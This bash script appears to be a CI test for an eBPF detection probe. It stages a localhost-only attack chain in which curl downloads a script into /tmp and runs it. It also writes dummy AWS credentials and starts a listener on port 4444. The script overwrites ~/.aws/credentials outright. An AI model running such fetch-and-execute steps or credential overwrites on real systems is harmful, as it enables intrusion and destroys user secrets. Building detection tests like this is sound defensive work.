#!/bin/bash
# Live eBPF check (CI only, needs sudo + bpftrace): start the probe, run a benign
# but attack-shaped chain entirely on localhost, stop the probe.
#   download (127.0.0.1:8081) -> exec from /tmp -> read dummy creds
#   -> write dummy persistence -> connect to local listener (127.0.0.1:4444, [::1]:4445)
# Nothing leaves the runner. Output: $OUT/capture.log, $OUT/chain.json
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$HERE/../.." && pwd)"
OUT="${OUT:-$REPO/live-out}"
mkdir -p "$OUT" "$OUT/www"
cp "$HERE/stage.sh" "$OUT/www/stage.sh"

# dummy credential file (fake values) - created BEFORE tracing starts
mkdir -p "$HOME/.aws"
printf '[default]\naws_access_key_id = AKIAROOTLINELABDUMMY\naws_secret_access_key = not-a-real-secret\n' \
  > "$HOME/.aws/credentials"

# local-only servers
python3 -m http.server 8081 --bind 127.0.0.1 --directory "$OUT/www" >"$OUT/http.log" 2>&1 &
HTTP=$!
python3 -m http.server 4445 --bind ::1 --directory "$OUT/www" >"$OUT/http6.log" 2>&1 &
HTTP6=$!
python3 -c "
import socket
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', 4444)); s.listen(1)
c, _ = s.accept(); print(c.recv(100)); c.close()
" >"$OUT/listener.log" 2>&1 &
LST=$!
sleep 1

sudo bpftrace "$REPO/probes/rootline.bt" >"$OUT/capture.log" 2>"$OUT/bpftrace.err" &
BPF=$!
for _ in $(seq 1 60); do grep -q "Attaching" "$OUT/bpftrace.err" 2>/dev/null && break; sleep 1; done
sleep 2
cat "$OUT/bpftrace.err"

# ---- the chain (a subshell so it has its own process subtree) ----
bash -c '
  curl -s -o /tmp/rootline-lab-stage.sh http://127.0.0.1:8081/stage.sh
  chmod +x /tmp/rootline-lab-stage.sh
  /tmp/rootline-lab-stage.sh
' &
CHAIN=$!
wait $CHAIN
echo "{\"chain_pid\": $CHAIN}" > "$OUT/chain.json"
sleep 2

sudo pkill -INT -x bpftrace || true
wait $BPF || true
kill $HTTP $HTTP6 2>/dev/null || true
wait $LST 2>/dev/null || true
rm -f /tmp/rootline-lab-stage.sh "$HOME/.config/systemd/user/rootline-lab.service"
echo "capture: $(wc -l < "$OUT/capture.log") lines"
